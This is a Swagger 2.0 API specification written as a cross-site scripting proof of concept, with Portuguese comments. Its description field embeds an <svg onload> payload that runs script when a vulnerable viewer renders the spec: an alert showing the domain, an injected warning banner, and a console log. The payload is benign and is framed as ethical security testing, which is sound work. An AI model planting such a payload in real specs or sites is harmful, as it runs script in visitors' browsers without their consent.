swagger: "2.0"
info:
  title: "⚠️ SECURITY TEST - XSS PoC"
  description: |
    <svg width="0" height="0" onload="
      // PoC não malicioso - apenas demonstração
      alert('🚨 XSS Confirmado!\n\nAlvo: ' + document.domain + '\n\nEsta é uma demonstração de segurança ética.');
      
      // Adicionar marcador visual
      var marker = document.createElement('div');
      marker.style = 'position:fixed; top:0; left:0; right:0; background:red; color:white; padding:15px; text-align:center; font-weight:bold; z-index:99999;';
      marker.innerHTML = '🔓 VULNERABILIDADE XSS DETECTADA - Teste de Segurança Ética';
      document.body.appendChild(marker);
      
      // Testar acesso básico (sem roubar dados)
      console.log('XSS executado em:', window.location.href);
    ">
  version: "1.0.0"
  contact:
    name: Security Researcher
    email: security@example.com
host: "api.example.com"
basePath: "/v1"
schemes:
  - "https"
  - "http"
paths:
  /test:
    get:
      tags:
        - "test"
      summary: "Endpoint de teste"
      description: "Descrição do endpoint"
      operationId: "testEndpoint"
      responses:
        200:
          description: "Sucesso"
